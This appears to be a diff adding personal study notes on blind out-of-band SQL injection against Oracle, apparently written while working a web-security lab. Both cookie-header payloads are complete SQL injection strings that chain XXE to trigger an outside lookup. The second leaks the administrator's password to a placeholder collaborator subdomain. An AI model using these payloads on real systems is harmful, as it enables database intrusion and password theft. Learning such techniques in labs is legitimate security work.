@@ -1,0 +1,17 @@
+
+[ WEB > SQLI > ORACLE > BLIND OUT OF BAND ]
+
+// combine sqli with xxe to trigger dns lookup
+// type this then right click the xxe url and insert a burp collaborate subdomain...
+// or, use your own domain to test.
+// burp collaborator is only available with burp suite pro, unfortunately...
+Cookie: TrackingId=fykyQAVqtDzZtF9e' union select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://burp-collab-subd/"> %remote%3B]>'), '/l') from dual--
+
+// gonna take notes even though I couldn't test due to lack of Burp Pro sub for Collaborator...
+Cookie: TrackingId=fykyQAVqtDzZtF9e' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
+
+// Arg! My C2 is currently on hold due to budget, etc.
+// Can't use Burp Collaborator because it requires Pro +_+
+// Will re-approach this maybe in the future...
+
+
